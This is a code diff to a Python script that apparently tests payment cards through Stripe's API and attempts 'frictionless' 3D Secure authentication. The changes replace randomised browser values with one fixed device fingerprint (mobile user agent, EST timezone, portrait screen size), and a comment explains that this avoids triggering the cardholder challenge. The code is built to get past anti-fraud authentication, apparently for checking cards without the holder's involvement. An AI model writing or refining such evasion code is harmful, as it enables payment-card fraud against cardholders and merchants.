@@ -17,7 +17,7 @@ from typing import Optional, Tuple, Dict
 
 logger = logging.getLogger(__name__)
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"  # Friend's mobile profile
 STRIPE_API = "https://api.stripe.com/v1"
 
 LIVE_DECLINE_CODES = [
@@ -51,9 +51,9 @@ def _classify_error(error_data):
 
 
 def _build_js_headers(passed_headers, content_type="application/x-www-form-urlencoded"):
-    ua = (passed_headers or {}).get("user-agent") or (passed_headers or {}).get("User-Agent") or UA
+    # Always use friend's mobile UA for 3DS authenticate — mismatched UA = challenge trigger
     headers = {
-        "User-Agent": ua,
+        "User-Agent": UA,  # Friend's Android/Chrome 120 Mobile UA (fixed)
         "Content-Type": content_type,
         "Origin": "https://js.stripe.com",
         "Referer": "https://js.stripe.com/",
@@ -231,7 +231,7 @@ async def attempt_3ds2_frictionless(loop, session, pk, client_secret, intent_id,
 
     await asyncio.sleep(random.uniform(2.0, 3.5))
 
-    tz_offset = str(random.choice([-480, -420, -360, -300, -240, 0, 60, 120, 180, 330, 480, 540]))
+    tz_offset = "-300"  # Friend's fixed EST timezone
 
     # Build authenticate variations
     auth_variations = []
@@ -267,8 +267,8 @@ async def attempt_3ds2_frictionless(loop, session, pk, client_secret, intent_id,
             "browserJavascriptEnabled": True,
             "browserLanguage": "en-US",
             "browserColorDepth": "24",
-            "browserScreenHeight": "1080",
-            "browserScreenWidth": "1920",
+            "browserScreenHeight": "873",   # Friend's mobile portrait
+            "browserScreenWidth": "393",    # Friend's mobile portrait
             "browserTZ": tz_offset,
             "browserUserAgent": js_headers["User-Agent"],
         })
